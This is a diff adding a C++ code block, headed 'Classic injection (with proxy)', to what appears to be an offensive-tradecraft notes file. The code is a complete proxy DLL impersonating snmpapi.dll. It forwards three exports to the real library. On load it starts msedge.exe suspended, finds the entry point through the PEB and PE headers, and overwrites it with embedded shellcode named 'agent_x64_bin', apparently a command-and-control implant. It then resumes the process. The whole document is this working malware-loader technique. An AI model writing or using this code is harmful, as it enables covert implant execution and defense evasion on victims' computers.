@@ -149,5 +149,124 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 ## Classic injection (with proxy)
 
 ```cpp
+#include <Windows.h>
+#include <winternl.h>
+#include "shellcode.h"
 
+
+static HMODULE hReal = LoadLibraryA("C:\\Windows\\System32\\snmpapi.dll");
+
+extern "C" __declspec(dllexport) DWORD WINAPI SnmpSvcGetUptime()
+{
+    static auto fn = (DWORD(WINAPI*)())GetProcAddress(hReal, "SnmpSvcGetUptime");
+    return fn ? fn() : 0;
+};
+
+extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidNCmp(void* pOctets1, void* pOctets2, UINT nSubIds)
+{
+    static auto fn = (INT(WINAPI*)(void*, void*, UINT))GetProcAddress(hReal, "SnmpUtilOidNCmp");
+    return fn ? fn(pOctets1, pOctets2, nSubIds) : 0;
+}
+
+extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidCpy(void* pOidDst, void* pOidSec)
+{
+    static auto fn = (INT(WINAPI*)(void*, void*))GetProcAddress(hReal, "SnmpUtilOidCpy");
+    return fn ? fn(pOidDst, pOidSec) : 0;
+}
+
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    if (fdwReason != DLL_PROCESS_ATTACH)
+        return TRUE;
+
+    unsigned char* shellcode = agent_x64_bin;
+    unsigned int shellcode_len = agent_x64_bin_len;
+
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+
+    PROCESS_INFORMATION pi = { 0 };
+
+    // spawn process in suspended state
+    CreateProcessW(
+        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        L"C:\\Windows\\System32",
+        &si,
+        &pi
+    );
+
+    // get the process information to find the address of the PEB
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    ULONG returnLength;
+    NtQueryInformationProcess(
+        pi.hProcess,
+        ProcessBasicInformation,
+        &pbi,
+        sizeof(pbi),
+        &returnLength
+    );
+
+    // the image base address is always at PEB + 0x10 for x64
+    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);
+
+    // read the base address (addresses are 8 bytes for x64)
+    LPVOID baseAddress = 0;
+    SIZE_T bytesRead = 0;
+    ReadProcessMemory(
+        pi.hProcess,
+        lpBaseAddress,
+        &baseAddress,
+        8,
+        &bytesRead
+    );
+
+    // now we can read the dos header
+    IMAGE_DOS_HEADER dHeader = { 0 };
+    ReadProcessMemory(
+        pi.hProcess,
+        baseAddress,
+        &dHeader,
+        sizeof(dHeader),
+        &bytesRead
+    );
+
+    // use e_lfanew to calculate pointer to nt header
+    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);
+
+    // read the nt header
+    IMAGE_NT_HEADERS ntHeaders = { 0 };
+    ReadProcessMemory(
+        pi.hProcess,
+        lpNtHeader,
+        &ntHeaders,
+        sizeof(ntHeaders),
+        &bytesRead
+    );
+
+    // calculate the entry point address
+    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
+
+    // write shellcode to this location, overwriting the PE
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        pi.hProcess,
+        entryPoint,
+        shellcode,
+        shellcode_len,
+        &bytesWritten
+    );
+
+    // resume the process
+    ResumeThread(pi.hThread);
+
+    return TRUE;
+}
 ```
